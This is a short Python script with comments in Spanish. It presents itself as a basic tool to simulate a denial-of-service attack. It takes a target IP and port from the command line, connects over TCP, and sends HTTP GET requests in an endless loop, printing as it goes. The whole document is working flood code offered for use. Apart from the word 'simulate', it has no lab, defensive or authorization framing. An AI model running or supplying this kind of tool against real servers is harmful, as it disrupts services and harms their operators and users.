# Herramienta básica para simular un ataque DoS (Denegación de Servicio).

import socket
import sys

# Verifica que se haya proporcionado la dirección IP y el puerto como argumentos.
if len(sys.argv) != 3:
    print("Uso: python3 dos_tool.py <IP> <Puerto>")
    sys.exit(1)

# Asigna la dirección IP y el puerto objetivo proporcionados como argumentos en la línea de comandos.
target_ip = sys.argv[1]
target_port = int(sys.argv[2])

# Crea un socket de red TCP/IP.
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error as err:
    print(f"No se pudo crear el socket. Error: {err}")
    sys.exit(1)

# Intenta conectar al servidor objetivo.
try:
    s.connect((target_ip, target_port))
    print(f"Conectado exitosamente a {target_ip} en el puerto {target_port}.")
    print("Presiona Ctrl+C para detener el ataque.")
except socket.error as err:
    print(f"No se pudo conectar al servidor. Error: {err}")
    sys.exit(1)

# Envía un mensaje simple en un bucle infinito para simular el ataque DoS.
try:
    # Se construye una petición HTTP básica como ejemplo.
    message = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
    while True:
        # Envía la petición al servidor.
        s.sendto(message.encode('utf-8'), (target_ip, target_port))
        print("Petición enviada!")
except KeyboardInterrupt:
    print("\nAtaque interrumpido por el usuario.")
    s.close()
    sys.exit(0)
except socket.error as err:
    print(f"Error al enviar la petición. Error: {err}")
    s.close()
    sys.exit(1)
